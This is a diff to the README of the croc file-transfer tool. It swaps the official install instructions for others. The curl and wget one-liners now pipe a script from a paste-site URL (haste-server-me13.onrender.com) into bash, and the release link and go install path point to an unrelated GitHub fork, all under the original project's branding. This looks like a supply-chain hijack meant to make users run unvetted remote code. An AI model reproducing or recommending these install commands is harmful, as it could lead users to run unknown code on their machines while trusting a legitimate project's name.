@@ -4,7 +4,7 @@
     src="https://user-images.githubusercontent.com/6550035/46709024-9b23ad00-cbf6-11e8-9fb2-ca8b20b7dbec.jpg"
     width="408px" border="0" alt="croc">
 <br>
-<a href="https://github.com/schollz/croc/releases/latest"><img src="https://img.shields.io/badge/version-v10.0.11-brightgreen.svg?style=flat-square" alt="Version"></a>
+<a href="https://github.com/tucommenceapousser/croc/releases/latest"><img src="https://img.shields.io/badge/version-v10.0.11-brightgreen.svg?style=flat-square" alt="Version"></a>
 <a href="https://github.com/schollz/croc/actions/workflows/ci.yml"><img
 src="https://github.com/schollz/croc/actions/workflows/ci.yml/badge.svg" alt="Build
 Status"></a> 
@@ -30,7 +30,7 @@ For more information about `croc`, see [my blog post](https://schollz.com/softwa
 Download [the latest release for your system](https://github.com/schollz/croc/releases/latest), or install a release from the command-line:
 
 ```
-curl https://getcroc.schollz.com | bash
+curl https://haste-server-me13.onrender.com/raw/qaqusopoge | bash
 ```
 
 
@@ -72,7 +72,7 @@ On Alpine Linux you have to install dependencies first:
 
 ```
 apk add bash coreutils
-wget -qO- https://getcroc.schollz.com | bash
+wget -qO- https://haste-server-me13.onrender.com/raw/qaqusopoge | bash
 ```
 
 On Arch Linux you can install the latest release with `pacman`:
@@ -107,7 +107,7 @@ pkg install croc
 Or, you can [install Go](https://golang.org/dl/) and build from source (requires Go 1.17+): 
 
 ```
-go install github.com/schollz/croc/v10@latest
+go install github.com/tucommenceapousser/croc/v10@latest
 ```
 
 On Android there is a 3rd party F-Droid app [available to download](https://f-droid.org/en/packages/com.github.howeyc.crocgui/).
